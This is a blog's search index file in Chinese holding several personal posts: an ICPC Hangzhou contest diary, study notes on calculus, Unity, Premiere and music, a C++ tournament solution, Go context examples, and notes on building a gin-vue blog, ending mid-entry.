<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一次2024ICPC杭州站</title>
      <link href="/2024/11/11/dailyrecord/2024_11_11/"/>
      <url>/2024/11/11/dailyrecord/2024_11_11/</url>
      
        <content type="html"><![CDATA[<h1 id="记一次2024ICPC杭州站"><a href="#记一次2024ICPC杭州站" class="headerlink" title="记一次2024ICPC杭州站"></a>记一次2024ICPC杭州站</h1><p>爆零拿到最后一名，难蚌了,下面就放一些美图记录下这两天——味大，无需多言</p><ul><li>到达沉降东站！</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/336038ba0a3ecd6c97fb2b6f6796f4d.jpg" class="" title="沉降东站"><ul><li>房间有点小，还靠近马路，体验很差！</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/5552ada2db3432791221b43f70e4b2a.jpg" class="" title="双人间"><ul><li>参赛队伍：好多985211✌，旁边两个211，顶不住啊/(ㄒoㄒ)/~~</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/d9f92f3e6dd0f8c02ecf51055854f8d.jpg" class="" title="参赛单位"><ul><li>杭师大体育馆（PS：好大，可以开演唱会！）</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/c22defee251c42514a398d442a853c8.jpg" class="" title="体育馆外景"><img src="/2024/11/11/dailyrecord/2024_11_11/40ed7631021cf214cc505d4cf915020.jpg" class="" title="杭师大体育馆内景"><ul><li>抽奖抽中数据线，ICPC比赛送了包包和卫衣，福利还是很不错的：</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/fe6cb4e95452cca0f845b6760db575a.jpg" class="" title="抽奖"><ul><li>热身赛A题，错把0看成回答正确的输出，赛中罚时n下仍未做出，以后交互题还得是一行一行看啊。</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/77ae8d00ccd57eb3f0a834ec89d2aa8.jpg" class="" title="A Problem"><ul><li>正式赛</li></ul><p>算了，还是省略吧</p><img src="/2024/11/11/dailyrecord/2024_11_11/ee3fd86281f109d06813bdc88309bc0.jpg" class="" title="这下真是幻想了（bush"><ul><li>附上一些杭师大美图（美丽又现代）</li></ul><img src="/2024/11/11/dailyrecord/2024_11_11/e725c6c46ac4d3ba4a84aa71874551b.jpg" class="" title="傍晚晚霞"><img src="/2024/11/11/dailyrecord/2024_11_11/a0a6649fd341acf363a5f72b85db7a4.jpg" class="" title="科幻的图书馆与档案馆"><img src="/2024/11/11/dailyrecord/2024_11_11/f4b2852e95a5f44ccad6e1c5ab9a944.jpg" class="" title="附近就是阿里巴巴园区，校外真的很现代"><ul><li>总结</li></ul><p>本身没报着幻想去参加的，但是没想到会输的那么惨。只能积极备战明年省赛。</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/10/15/math/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/"/>
      <url>/2024/10/15/math/%E9%AB%98%E7%AD%89%E6%95%B0%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h3 id="极限"><a href="#极限" class="headerlink" title="极限"></a>极限</h3><p><a href="https://zhuanlan.zhihu.com/p/133508725">【数学荟萃】第3期：彻底讲清楚等价无穷小使用规则 - 知乎 (zhihu.com)</a></p><p>中值定理</p><p><a href="https://www.zhihu.com/tardis/zm/art/576719066?source_id=1005">微分中值定理—拉格朗日中值定理(辅助函数构造) (zhihu.com)</a></p><p>极坐标</p><p><a href="https://zhuanlan.zhihu.com/p/203377553">关于极坐标 - 知乎 (zhihu.com)</a></p><p><img src="C:\Users\lrj32\Desktop\_posts\math\高等数学.assets\image-20241016211233983.png" alt="image-20241016211233983"></p><p><img src="C:\Users\lrj32\Desktop\_posts\math\高等数学.assets\image-20241016211300133.png" alt="image-20241016211300133"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/29/potato_clock/v0.01/"/>
      <url>/2024/09/29/potato_clock/v0.01/</url>
      
        <content type="html"><![CDATA[<p>在测试中，Mock对象通常用于模拟数据库访问、网络请求、文件系统交互等可能影响测试稳定性和性能的操作。<br>例如，如果你正在测试一个函数，该函数需要从数据库中获取数据，你可以使用Mock对象来模拟数据库调用，而不是实际查询数据库。这样，你的测试就不会依赖于数据库的状态，也不会因为数据库的响应时间而变慢。</p><p>加入艾宾浩斯遗忘曲线</p><p>通过3D坐标内的移动来切换不同的视角</p><p>组件化各项功能，</p><p>Assets<br>这是Unity项目中存放所有资源的根目录，包括所有的游戏资源，如模型、纹理、脚本、音频等。<br>Art<br>这个目录通常用来存放所有与游戏的视觉艺术相关的资源。Materials存放材质文件，材质定义了物体表面的视觉和物理属性，如颜色、光泽、透明度等。<br>Models存放3D模型文件，这些是游戏中的物体、角色和环境的三维表示。<br>Textures存放纹理文件，纹理是用于覆盖3D模型表面的图像，用于增加细节和真实感。<br>Audio<br>这个目录用于存放游戏中使用的所有音频文件。Music存放背景音乐文件，通常是循环播放的曲目，用于营造游戏氛围。<br>Sound存放音效文件，如角色的脚步声、物品的碰撞声等。<br>Scripts<br>存放C#脚本文件，这些脚本用于编写游戏逻辑、控制游戏对象的行为、处理用户输入等。<br>Shaders<br>存放着色器文件和着色器图，着色器用于定义Unity中物体的渲染方式，包括光照、阴影、反射等视觉效果。<br>Docs<br>存放项目相关的文档资料，如开发Wiki、概念艺术图、市场宣传材料等。<br>Level<br>存放与游戏关卡设计相关的资源。Prefabs存放预制体文件，预制体是可复用的游戏对象，可以包含模型、脚本、纹理等多种资源的组合。<br>Scenes存放Unity场景文件，场景是游戏世界的单个实例，可以包含多个游戏对象和环境设置。<br>UI存放用户界面相关的资源，如菜单、按钮、HUD（头上显示）元素等。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%840x2/"/>
      <url>/2024/09/26/%E7%AE%97%E6%B3%95/%E6%B4%9B%E8%B0%B7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%840x2/</url>
      
        <content type="html"><![CDATA[<h3 id="P4715-【深基16-例1】淘汰赛"><a href="#P4715-【深基16-例1】淘汰赛" class="headerlink" title="P4715 【深基16.例1】淘汰赛"></a>P4715 【深基16.例1】淘汰赛</h3><p><img src="洛谷数据结构0x2.assets/image-20240815140918297.png" alt="image-20240815140918297"></p><p>这题其实是二叉树左子树和右子树之间的比较，可以使用队列来不断求值，亦可以找出左右部分最大值，比较得出亚军。</p><p><a href="https://www.luogu.com.cn/article/8l8sccky">题解 P4715 【深基16.例1】淘汰赛 - 洛谷专栏 (luogu.com.cn)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; pii;</span><br><span class="line">queue&lt;pii&gt; que;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  n=<span class="number">1</span>&lt;&lt;n;    <span class="comment">//n&lt;&lt;=1  要注意下这里,我这里写错了debug半天，原先写的是将1右移一位即2。</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="type">int</span> tmp;</span><br><span class="line">    cin &gt;&gt; tmp;</span><br><span class="line">    que.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(tmp, i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (que.<span class="built_in">size</span>() != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">auto</span> a = que.<span class="built_in">front</span>();</span><br><span class="line">    que.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="keyword">auto</span> b = que.<span class="built_in">front</span>();</span><br><span class="line">    que.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (a.first &gt; b.first) &#123;</span><br><span class="line">      que.<span class="built_in">push</span>(a);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      que.<span class="built_in">push</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> a = que.<span class="built_in">front</span>();</span><br><span class="line">  que.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="keyword">auto</span> b = que.<span class="built_in">front</span>();</span><br><span class="line">  que.<span class="built_in">pop</span>();</span><br><span class="line">  <span class="keyword">if</span> (a.first &lt; b.first) &#123;</span><br><span class="line">    cout &lt;&lt; a.second &lt;&lt; endl;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    cout &lt;&lt; b.second &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; <span class="built_in">solve</span>(); &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/pr/pr%E5%85%A5%E9%97%A8/"/>
      <url>/2024/09/26/pr/pr%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<ul><li><p>mp4：MP4是一种容器格式，可以包含<code>H.264</code>编码的视频和音频流</p></li><li><p>组件：粗剪，对原始素材进行初步筛选和组合的过程。</p></li><li><p>编辑：精剪，进行更细致的编辑工作。</p></li><li><p>颜色：调色，对视频的颜色进行校正和美化的过程。</p></li><li><p>效果：特效，添加的视觉和动态效果。</p></li><li><p>音频：音频处理，包括声音的编辑、混音、音效添加和背景音乐的嵌入。</p></li></ul><p><strong>蒙太奇（Montage）</strong>：是一种电影和视频制作中的剪辑技术，它通过将不同的图像、场景或片段快速剪辑在一起，来传达一个概念、情感或故事，而不是仅仅依赖于单个镜头的内容。</p><p>预览</p><ul><li>向前播放J</li><li>向后播放L</li><li>暂停K</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/music/0x1/"/>
      <url>/2024/09/26/music/0x1/</url>
      
        <content type="html"><![CDATA[<ul><li>作词（Lyric Writing）：作词是指创作歌曲中的文字内容，它通常传达了歌曲的主题、情感和信息。</li><li>作曲（Composition）：创作歌曲的旋律和和声结构。</li><li>编曲（Arrangement）：根据作曲的旋律和和声，安排乐器和声音的具体配置。</li><li>混音（Mixing）将所有独立的音频轨道合成一个音频文件。</li></ul><p>编曲靠实力，混音靠money</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/golang/go-blog/"/>
      <url>/2024/09/26/golang/go-blog/</url>
      
        <content type="html"><![CDATA[<h3 id="context"><a href="#context" class="headerlink" title="context"></a>context</h3><ul><li>context用于在不同协程中传递数据</li></ul><p>context定义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Context <span class="keyword">interface</span> &#123;</span><br><span class="line">Done() &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125; <span class="comment">// 返回一个channel，用于通知当前Context的取消，父协程通过监听管道判断是否被关闭</span></span><br><span class="line"></span><br><span class="line">Err() <span class="type">error</span> <span class="comment">// 返回当前Context的取消原因</span></span><br><span class="line"></span><br><span class="line">Deadline() (deadline time.Time, ok <span class="type">bool</span>) <span class="comment">//  返回当前Context的截止时间</span></span><br><span class="line"></span><br><span class="line">Value(key <span class="keyword">interface</span>&#123;&#125;) <span class="keyword">interface</span>&#123;&#125; <span class="comment">// 返回传递的键值对</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="context-TODO-和-context-Background"><a href="#context-TODO-和-context-Background" class="headerlink" title="context.TODO()和 context.Background()"></a>context.TODO()和 context.Background()</h4><ul><li><code>context.Background()</code> 是一个通用的构建块，用于构建整个 <code>Context</code> 树的起点。</li><li><code>context.TODO()</code> 是一个临时的占位符，用于标记代码中尚未处理的部分。</li></ul><h4 id="传递数据"><a href="#传递数据" class="headerlink" title="传递数据"></a>传递数据</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f1</span><span class="params">(ctx context.Context)</span></span> context.Context &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> context.WithValue(ctx, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Randolfluo&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// context可用于传递数据，如用户信息，请求ID等</span></span><br><span class="line">backctx1 := context.Background() <span class="comment">//创建一个background context，作为context的根</span></span><br><span class="line">f1ret := f1(backctx1)<span class="comment">//返回新context</span></span><br><span class="line">fmt.Println(f1ret.Value(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取消派生的context（timeout，deadline）"><a href="#取消派生的context（timeout，deadline）" class="headerlink" title="取消派生的context（timeout，deadline）"></a>取消派生的context（timeout，deadline）</h4><ul><li>可以设置取消条件（如网络请求超时）</li><li>一旦 <code>Context</code> 被取消或超时，任何监听 <code>ctx.Done()</code> 通道的 goroutine 都会收到一个通知。</li><li><strong>通道关闭时，所有等待接收的协程都会被唤醒。</strong>因此可以在函数、协程、主函数打印状态</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">f1</span><span class="params">(ctx context.Context)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">fmt.Println(<span class="string">&quot;goroutine done&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;114514&quot;</span>)</span><br><span class="line">time.Sleep(time.Millisecond * <span class="number">100</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">fmt.Println(<span class="string">&quot;timeout&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">backctx1 := context.Background()</span><br><span class="line"></span><br><span class="line">ctx, cancel := context.WithTimeout(backctx1, time.Millisecond*<span class="number">500</span>)</span><br><span class="line"><span class="keyword">defer</span> cancel() <span class="comment">// 手动取消上下文，确保退出时调用，释放资源。</span></span><br><span class="line">f1(ctx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">fmt.Println(<span class="string">&quot;f1 done&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(ctx.Err())  <span class="comment">// context deadline exceeded</span></span><br><span class="line">time.Sleep(time.Second) <span class="comment">//在主Goroutine结束之后其他的所有Goroutine都会直接退出,因此我们需要等待协程执行完毕</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="https://go.dev/blog/context">https://go.dev/blog/context</a></li><li><a href="https://www.bilibili.com/video/BV1Rh411P7oN/?spm_id_from=333.788.recommend_more_video.2&amp;vd_source=f59fd02e7da0d60ea4cdebb5e1c5f0d7">golang context该怎么玩儿_哔哩哔哩_bilibili</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/gin-vue-blog/vue/"/>
      <url>/2024/09/26/gin-vue-blog/vue/</url>
      
        <content type="html"><![CDATA[<p>多个git项目</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── README.md             # 项目说明文件，通常包含项目的简介、安装和使用说明</span><br><span class="line">├── eslint.config.js      # ESLint 配置文件，用于定义代码风格和语法检查规则</span><br><span class="line">├── index.html            # 项目的主 HTML 文件，通常是应用的入口</span><br><span class="line">├── jsconfig.json         # JavaScript 配置文件，用于配置 JavaScript 项目</span><br><span class="line">├── node_modules          # 存放项目依赖的文件夹，由包管理工具（如 npm 或 pnpm）生成</span><br><span class="line">├── package.json          # 项目的配置文件，包含项目的基本信息、依赖项、脚本等</span><br><span class="line">├── pnpm-lock.yaml        # pnpm 的锁定文件，记录了具体的依赖版本信息</span><br><span class="line">├── public                # 存放静态资源的文件夹，如图片、字体等，这些资源不会被打包工具处理</span><br><span class="line">├── src                   # 存放源代码的文件夹，包括组件、页面、样式等</span><br><span class="line">├── uno.config.js         # UnoCSS 的配置文件，用于定义和配置 UnoCSS</span><br><span class="line">├── vite.config.js        # Vite 的配置文件，用于定义项目的构建和开发配置</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── App.vue            # 根组件，应用的主入口组件</span><br><span class="line">├── api.js             # 用于封装和管理 API 请求的文件</span><br><span class="line">├── assets             # 存放静态资源的文件夹，如图片、字体等</span><br><span class="line">├── components         # 存放全局和通用组件的文件夹</span><br><span class="line">├── main.js            # 入口文件，用于初始化 Vue 实例并挂载到 DOM</span><br><span class="line">├── router.js          # 路由配置文件，用于定义应用的路由</span><br><span class="line">├── store              # 状态管理文件夹，通常包含 Vuex 配置</span><br><span class="line">├── styles             # 存放全局样式和 CSS 文件的文件夹</span><br><span class="line">├── utils              # 实用工具函数的文件夹</span><br><span class="line">└── views              # 存放视图组件的文件夹，通常对应应用的各个页面</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile             # 用来定义Docker镜像的文件，包含构建镜像的步骤</span><br><span class="line">├── README.md              # 项目说明文件，描述项目概览、功能和使用说明</span><br><span class="line">├── assets                 # 存放静态资源的文件夹（如图片、CSS、JavaScript等）</span><br><span class="line">├── cmd                    # 存放Go项目中的主程序入口，每个子文件夹对应一个可执行程序</span><br><span class="line">├── config.docker.yml      # Docker专用的配置文件，定义应用在Docker环境中的设置</span><br><span class="line">├── config.yml             # 通用配置文件，存放与应用程序相关的配置信息</span><br><span class="line">├── docs                   # 项目文档文件夹，可能包括API文档、用户手册等</span><br><span class="line">├── go.mod                 # Go模块文件，定义项目的依赖和版本</span><br><span class="line">├── go.sum                 # Go依赖校验文件，记录依赖包的校验和，保证一致性</span><br><span class="line">├── internal               # 内部代码文件夹，仅供本项目使用，限制外部访问</span><br><span class="line">└── swag_init.sh           # Swagger初始化脚本，用于生成Swagger API文档</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/09/26/gin-vue-blog/go/"/>
      <url>/2024/09/26/gin-vue-blog/go/</url>
      
        <content type="html"><![CDATA[<p>go进阶<a href="https://www.yuque.com/aceld/golang">Golang修养之路 (yuque.com)</a></p><h3 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h3><p><a href="https://zhuanlan.zhihu.com/p/555833984">阿里巴巴Java开发手册中的DO、DTO、BO、AO、VO、POJO定义 - 知乎 (zhihu.com)</a></p><h3 id="使用到的库："><a href="#使用到的库：" class="headerlink" title="使用到的库："></a>使用到的库：</h3><ul><li><code>golang.org/x/crypto/bcrypt</code>:由于加密库的是十分敏感的，因此<code>crypto</code>库的代码需要审核后托管在官方仓库，<code>bcrypt</code> 是一种密码哈希函数结合了盐值（salt）和多轮哈希（rounds of hashing）。</li><li></li></ul><h2 id="前台："><a href="#前台：" class="headerlink" title="前台："></a>前台：</h2><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p>redis：是一个高性能的key-value数据库，将数据存储在内存中，方便高效读写</p><ul><li><p>Redis默认支持16个数据库</p></li><li><p><a href="https://blog.csdn.net/liqingtx/article/details/60330555">超强、超详细Redis入门教程_这篇文章主要介绍了超强、超详细redis入门教程,本文详细介绍了redis数据库各个方-CSDN博客</a></p></li><li><p>支持<strong>持久化</strong></p><ul><li><code>RDB&lt;快照持久化: 每隔一段时间写入&gt;</code></li><li><code>AOF&lt;追加文件持久化：每个写都会追加到AOF文件s&gt;</code></li><li><a href="https://blog.csdn.net/ll594317566/article/details/109215575">Redis的两种持久化RDB和AOF（超详细）_rdb aof-CSDN博客</a></li><li></li></ul></li><li><p><strong>主从复制：</strong>允许将数据从一个 Redis 服务器（称为“主节点”）复制到一个或多个 Redis 服务器（称为“从节点”），可用于数据冗余，故障转移，分散节点提高读性能。</p></li><li><strong>高可用和分布式：</strong></li></ul><h2 id="后台："><a href="#后台：" class="headerlink" title="后台："></a>后台：</h2><h3 id="JSON-Web-Tokens-JWT-鉴权"><a href="#JSON-Web-Tokens-JWT-鉴权" class="headerlink" title="JSON Web Tokens (JWT)鉴权"></a>JSON Web Tokens (JWT)鉴权</h3><p>通过JSON形式作为Web应用中的令牌</p><ul><li>认证鉴权</li><li>信息交换</li></ul><p>JWT与Session的区别</p><ul><li><strong>跨域问题</strong>：Session使用Cookie，而Cookie无法跨域，JWT没有这个问题。</li><li><strong>服务器开销</strong>：Session需要在服务器存储每个用户的登录信息，而JWT自身携带用户信息，不需要额外的服务器存储空间。</li><li><strong>分布式系统</strong>：JWT更适合分布式系统，因为它是无状态的</li></ul><p><a href="https://golang-jwt.github.io/jwt/">https://golang-jwt.github.io/jwt/</a></p><p><a href="https://jwt.io/introduction">https://jwt.io/introduction</a></p><p><a href="https://www.cnblogs.com/zichliang/p/17303759.html">Golang 一日一库之jwt-go - 始識 - 博客园 (cnblogs.com)</a></p><h3 id="CASBIN"><a href="#CASBIN" class="headerlink" title="CASBIN"></a>CASBIN</h3><ul><li>访问控制框架，支持多种访问控制模型。</li><li>这个项目基于角色的访问控制（RBAC, Role-Based Access Control）是一种广泛使用的访问控制机制，它通过将权限与角色关联，再将角色分配给用户，从而实现对资源的访问控制</li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p> 前后端分离的核心：后台提供数据，前端负责显示</p><h3 id="RESTful-风格"><a href="#RESTful-风格" class="headerlink" title="RESTful 风格"></a>RESTful 风格</h3><p><a href="https://www.ruanyifeng.com/blog/2018/10/restful-api-best-practices.html">RESTful API 最佳实践 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><p>RESTful 的核心思想就是，客户端发出的数据操作指令都是”动词 + 宾语”的结构。</p><h3 id="APIFOX"><a href="#APIFOX" class="headerlink" title="APIFOX"></a>APIFOX</h3><p>集成的测试工具：Apifox = Postman + Swagger + Mock + JMeter</p><p>前端：</p><ul><li>Swagger：通常用于生成 API 文档，并为前端开发人员提供接口的说明和交互功能。</li><li>Mock：用于模拟后端 API 响应。</li></ul><p>后端：</p><ul><li>Postman：验证 API 的正确性、性能和响应数据。</li><li>JMeter：后端的性能和压力测试。</li></ul><h3 id="docker-compose-amp-k8s"><a href="#docker-compose-amp-k8s" class="headerlink" title="docker compose&amp;k8s"></a>docker compose&amp;k8s</h3><p><a href="https://docker-practice.github.io/zh-cn/">https://docker-practice.github.io/zh-cn/</a></p><ul><li>docker compose用于本地简单的容器编排</li><li>k8s适用于适合于构建分布式、高可用的生产环境。</li></ul><h3 id="nginx-amp-apache"><a href="#nginx-amp-apache" class="headerlink" title="nginx&amp;apache"></a>nginx&amp;apache</h3><p> <strong>nginx</strong></p><ul><li>nginx适合处理静态内容</li><li>可作反向代理服务器、负载均衡器</li></ul><p><strong>apache</strong></p><ul><li><p>apache适合处理动态内容</p></li><li><p>Apache 采用多线程模型，每个请求由一个独立的线程处理。</p></li></ul><h3 id="nuxt3"><a href="#nuxt3" class="headerlink" title="nuxt3"></a>nuxt3</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">├── global         # 用于存储全局变量或整个应用程序中共享的设置的目录或包</span><br><span class="line">├── handle         # 用于处理请求的目录或包，管理传入的 HTTP 请求</span><br><span class="line">├── helper.go      # 包含辅助功能的文件，用于协助代码库中的各种任务</span><br><span class="line">├── manager.go     # 负责管理应用程序核心组件的文件，可能处理逻辑、协调或资源管理</span><br><span class="line">├── manager_test.go# 针对 `manager.go` 中实现功能的单元测试文件</span><br><span class="line">├── middleware     # 包含中间件功能的目录或包，应用于 HTTP 请求，如日志记录、身份验证等</span><br><span class="line">├── model          # 